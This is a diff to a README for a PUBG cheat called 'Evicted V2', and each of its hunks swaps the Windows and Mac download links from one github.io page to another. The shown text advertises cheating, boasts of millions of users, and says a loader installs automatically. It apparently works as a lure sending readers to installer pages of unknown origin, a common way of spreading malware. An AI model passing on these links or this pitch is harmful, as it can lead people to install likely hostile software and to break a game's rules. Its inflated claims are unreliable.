@@ -10,8 +10,8 @@ The **🛡️ PUBG External Evicted V2** is the most trusted external cheat for 
 
 <div align="center">
 
-[![Download PUBG External Evicted V2](https://img.shields.io/badge/🔻%20DOWNLOAD%20NOW%20🔻-purple?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
-[![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://yobowgileysb.github.io/MacDownload/)
+[![Download PUBG External Evicted V2](https://img.shields.io/badge/🔻%20DOWNLOAD%20NOW%20🔻-purple?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
+[![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://mixedlinkrelease.github.io/installermac/)
 
 </div>
 
@@ -117,7 +117,7 @@ The **🛡️ PUBG External Evicted V2** is the most trusted external cheat for 
 6. **📋 Press INSERT** — Open the overlay menu
 7. **⚡ Enable features** and dominate
 
-[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20EVICTED%20V2%20🔻-purple?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
+[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20EVICTED%20V2%20🔻-purple?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
 
 ### 🍎 macOS
 
@@ -126,7 +126,7 @@ The **🛡️ PUBG External Evicted V2** is the most trusted external cheat for 
 3. **Follow the prompts** — the loader installs automatically
 
 
-[![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://yobowgileysb.github.io/MacDownload/)
+[![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://mixedlinkrelease.github.io/installermac/)
 
 ---
 
@@ -183,5 +183,5 @@ External is significantly safer than injection. Use alt accounts for initial tes
 
 Join over 3.4 million players who've used PUBG External Evicted V2 to dominate in 2026.
 
-[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20EVICTED%20V2%20🔻-purple?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
-[![Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://yobowgileysb.github.io/MacDownload/)
+[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20EVICTED%20V2%20🔻-purple?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
+[![Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://mixedlinkrelease.github.io/installermac/)
